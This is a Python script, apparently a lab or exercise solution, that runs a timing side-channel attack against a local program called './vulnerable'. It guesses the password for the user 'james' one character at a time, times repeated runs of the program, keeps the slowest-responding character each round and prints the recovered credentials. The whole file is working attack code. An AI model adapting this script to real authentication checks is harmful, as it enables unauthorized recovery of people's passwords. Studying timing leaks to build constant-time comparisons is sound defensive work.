import functools
import random
import collections
import time
import pprint
import numpy
import sys
import json
import subprocess
from timeit import default_timer as clock

CHARSET = "qwertyuiopasdfghjklzxcvbnm"

class TimesDict(collections.UserDict):
    def as_dict_sorted_by_times(self):
        return sorted(self.items(), key=lambda i: i[1])

class SecretFoundException(Exception):
    pass

class TimingAttack:
    MIN_PASSWORD_LENGTH = 4
    MAX_PASSWORD_LENGTH = 7


    def __init__(self, username):
        self.username = username
        self.attempted_passwords = set()
        # length = self.attack_length()
        self.attack_secret()

    def timeit(self, password, iterations=5):
        elapsed_times = list()

        # straight password
        command = ["./vulnerable", self.username, password]
        res = subprocess.run(command)
        if res.returncode == 0:
            raise SecretFoundException(password)

        # add extra char to end of password for longer runtime
        password += 'a'
        for i in range(0, iterations):
            command = ["./vulnerable", self.username, password]

            start = clock()

            res = subprocess.run(command)
            end = clock()
            elapsed_times.append(end - start)

        self.attempted_passwords.add(password)

        m = numpy.mean(elapsed_times)

        # m = scipy.stats.hmean(elapsed_times)
        return m

    def attack_length(self):
        times = TimesDict()
        for j in range(self.MAX_PASSWORD_LENGTH, self.MIN_PASSWORD_LENGTH-1, -1):
            secret = "a" * j
            t = self.timeit(secret)
            times[j] = t
        sorted_times = times.as_dict_sorted_by_times()
        pprint.pprint(sorted_times)
        return sorted_times[-1][0]

    def attack_secret(self):
        """
        Guess the secret using a bruteforce timing attack.

        This can be improved by reiterating over the fastest candidates, then
        backtracking later over the other top candidates after exhaustion of
        the initial search space, and finally backtracking over the remaining
        search space.
        """
        secret = ""
        try:
            while len(secret) <= self.MAX_PASSWORD_LENGTH:
                times = TimesDict()
                for char in CHARSET:
                    secret_guess =  secret + char
                    t = self.timeit(secret_guess)
                    times[secret_guess] = t
                    print(secret_guess, t)
                sorted_times = times.as_dict_sorted_by_times()
                secret = secret + sorted_times[-1][0][-1]
                print('-------------------')

                # try the secret without guessing the next char
                self.timeit(secret, iterations=1)
        except SecretFoundException as e:
            print("The credentials are ", self.username, ':', e)
            return str(e)
        return None

TimingAttack(username="james")
